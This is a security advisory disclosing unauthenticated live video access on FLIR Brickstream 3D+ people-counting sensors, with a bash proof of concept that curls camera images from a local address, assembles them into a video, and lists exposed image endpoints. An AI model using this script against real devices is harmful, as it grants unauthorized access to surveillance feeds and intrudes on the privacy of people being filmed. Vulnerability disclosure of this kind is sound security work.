FLIR Systems FLIR Brickstream 3D+ Unauthenticated RTSP Stream Disclosure


Vendor: FLIR Systems, Inc.
Product web page: http://www.brickstream.com
Affected version: Firmware: 2.1.742.1842
                  Api: 1.0.0
                  Node: 0.10.33
                  Onvif: 0.1.1.47

Summary: The Brickstream line of sensors provides highly accurate, anonymous
information about how people move into, around, and out of physical places.
These smart devices are installed overhead inside retail stores, malls, banks,
stadiums, transportation terminals and other brick-and-mortar locations to
measure people's behaviors within the space.

Desc: The FLIR Brickstream 3D+ sensor is vulnerable to unauthenticated and
unauthorized live RTSP video stream access.

Tested on: Titan
           Api/1.0.0


Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
                            @zeroscience


Advisory ID: ZSL-2018-5496
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5496.php


26.07.2018

--


#!/bin/bash
#
# PoC:
#

echo 'Fetching some images...'
for x in {1..10};
    do curl http://192.168.2.1:8083/middleImage.jpg -o sequence-$x.jpg -#;
    done
echo 'Done.'
sleep 2
echo 'Generating video...'
sleep 2
ffmpeg -r 1 -i sequence-%01d.jpg -c:v libx264 -vf fps=60 -pix_fmt yuv444p counted_people.mp4
echo 'Running generated video...'
sleep 2
vlc counted_people.mp4

#
# http://192.168.2.1:8083/middleImage.jpg
# http://192.168.2.1:8083/rightimage.jpg
# http://192.168.2.1:8083/leftimage.jpg
# http://192.168.2.1:8083/threeDimage.jpg
# http://192.168.2.1:8083/startStopTrafficMapImage.jpg
# http://192.168.2.1:8083/dwellTrafficMapImage.jpg
# http://192.168.2.1:8083/heightTrafficMapImage.jpg
#